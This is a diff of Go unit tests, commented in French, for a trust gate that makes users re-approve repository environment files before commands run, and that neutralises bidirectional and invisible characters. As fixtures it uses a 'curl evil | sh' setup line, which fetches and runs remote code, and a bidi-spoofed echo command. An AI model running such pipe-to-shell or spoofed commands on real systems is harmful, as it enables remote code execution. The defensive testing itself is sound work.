@@ -106,14 +106,20 @@ func TestReponseReprendLOuverture215(t *testing.T) {
 		if m2.msg == "" {
 			t.Errorf("touche %q : aucune suite d'ouverture (message vide)", key_)
 		}
-		// choix définitif : le dépôt change (git pull), plus de question
+		// l'approbation n'est PAS définitive : le dépôt change (git pull) → la question revient (« changé »)
 		_ = os.WriteFile(core.EnvPath(d), []byte("image: debian:12\nsetup:\n  - curl evil | sh\n"), 0o644)
 		m2.msg = ""
-		if m3 := m2.openSelected(); m3.form.mode == formTrust {
-			t.Errorf("touche %q : nouvelle question après un pull (choix définitif)", key_)
+		m3 := m2.openSelected()
+		if m3.form.mode != formTrust || m3.form.trust == nil || !m3.form.trust.Changed {
+			t.Errorf("touche %q : après un pull, la question doit revenir avec l'indication « changé » (mode=%v)", key_, m3.form.mode)
 		}
-		if core.EnvTrust(d) != want {
-			t.Errorf("touche %q : état %s après pull", key_, core.EnvTrust(d))
+		if core.EnvTrust(d) != core.TrustPending {
+			t.Errorf("touche %q : état %s après pull, attendu pending", key_, core.EnvTrust(d))
+		}
+		if m3.form.mode == formTrust {
+			if out := m3.renderTrust(100); !strings.Contains(out, "changé depuis l'approbation") {
+				t.Errorf("touche %q : l'écran ne dit pas que l'environnement a changé :\n%s", key_, out)
+			}
 		}
 	}
 }
@@ -172,5 +178,100 @@ func TestRenduSansSequencesTousLesChamps215(t *testing.T) {
 				t.Errorf("raw=%v : séquence du dépôt %q dans le rendu", raw, seq)
 			}
 		}
+	}
+}
+
+// Commande longue affichée EN ENTIER (retour à la ligne, jamais tronquée), packages_by_manager et champs watch / local /
+// prefer visibles, caractères bidirectionnels et invisibles neutralisés — résumé comme fichiers bruts, largeur étroite.
+func TestRenduCompletEtBidi215(t *testing.T) {
+	m, _ := guardModel215(t, "pod")
+	m = m.openSelected()
+	long := "apt-get install -y " + strings.Repeat("paquet-tres-long-", 20) + "FIN-DE-COMMANDE"
+	tr := m.form.trust
+	tr.Spec.OnStart = []string{long}
+	tr.Spec.Setup = []string{"echo \u202eevil\u202c \u200bx\u2066y\u2069 \ufeffz"}
+	tr.Spec.PackagesByManager = map[string][]string{"apt": {"jq", "curl"}, "dnf": {"wget"}}
+	tr.Spec.Watch = []string{"package.json"}
+	tr.Spec.Local = []string{"node_modules"}
+	tr.Spec.Prefer = "podman"
+	tr.Files = map[string]string{"env.yaml": "on_start:\n  - " + long + "\n", "env-template.yaml": ""}
+	flat := func(out string) string { // sans mise en forme : retours à la ligne et indentation retirés
+		out = strings.ReplaceAll(out, "\n", "")
+		for strings.Contains(out, "  ") {
+			out = strings.ReplaceAll(out, "  ", " ")
+		}
+		return strings.ReplaceAll(out, " ", "")
+	}
+	for _, w := range []int{50, 80, 120} {
+		for _, raw := range []bool{false, true} {
+			m.form.trustRaw = raw
+			out := m.renderTrust(w)
+			if !strings.Contains(flat(out), strings.ReplaceAll(long, " ", "")) {
+				t.Errorf("largeur %d raw=%v : la commande longue n'est pas affichée en entier (fin « FIN-DE-COMMANDE » perdue)", w, raw)
+			}
+			for _, bad := range []string{"\u202e", "\u202c", "\u200b", "\u2066", "\u2069", "\ufeff"} {
+				if strings.Contains(out, bad) {
+					t.Errorf("largeur %d raw=%v : caractère bidi/invisible %U dans le rendu", w, raw, []rune(bad)[0])
+				}
+			}
+			for _, line := range strings.Split(out, "\n") {
+				if n := len([]rune(stripStyle215(line))); n > w {
+					t.Errorf("largeur %d raw=%v : ligne de %d caractères (débordement)", w, raw, n)
+					break
+				}
+			}
+		}
+	}
+	m.form.trustRaw = false
+	out := m.renderTrust(100)
+	for _, want := range []string{"apt", "jq", "curl", "dnf", "wget", "package.json", "node_modules", "podman"} {
+		if !strings.Contains(out, want) {
+			t.Errorf("le résumé ne montre pas %q :\n%s", want, out)
+		}
+	}
+}
+
+// stripStyle215 : retire les séquences de style (CSI … m) de la coque pour mesurer la largeur affichée.
+func stripStyle215(s string) string {
+	var b strings.Builder
+	for i := 0; i < len(s); i++ {
+		if s[i] == 0x1b && i+1 < len(s) && s[i+1] == '[' {
+			j := i + 2
+			for j < len(s) && s[j] != 'm' {
+				j++
+			}
+			i = j
+			continue
+		}
+		b.WriteByte(s[i])
+	}
+	return b.String()
+}
+
+// trust.json illisible : la coque refuse (échec fermé), ne réécrit pas le fichier, ne démarre rien.
+func TestRegistreIllisibleCoque215(t *testing.T) {
+	m, d := guardModel215(t, "pod")
+	reg := filepath.Join(os.Getenv("CL_CONFIG_DIR"), "trust.json")
+	const broken = `{"coupé":`
+	if err := os.WriteFile(reg, []byte(broken), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	m = m.openSelected()
+	if m.form.mode != formTrust {
+		t.Fatalf("mode=%v : registre illisible, la garde doit rester fermée", m.form.mode)
+	}
+	nm, _ := m.onFormKey(key("a"))
+	m2 := nm.(model)
+	if m2.form.mode != formTrust || m2.form.err == "" {
+		t.Errorf("accepter avec registre illisible : mode=%v err=%q, attendu un refus affiché", m2.form.mode, m2.form.err)
+	}
+	if got, _ := os.ReadFile(reg); string(got) != broken {
+		t.Errorf("trust.json réécrit : %q", got)
+	}
+	if dtmux("has-session", "-t", exactS(hubSession)).Run() == nil {
+		t.Error("une session tmux existe : quelque chose a été démarré")
+	}
+	if _, err := core.LoadEnv(d); err == nil {
+		t.Error("LoadEnv rend l'environnement malgré le registre illisible")
 	}
 }
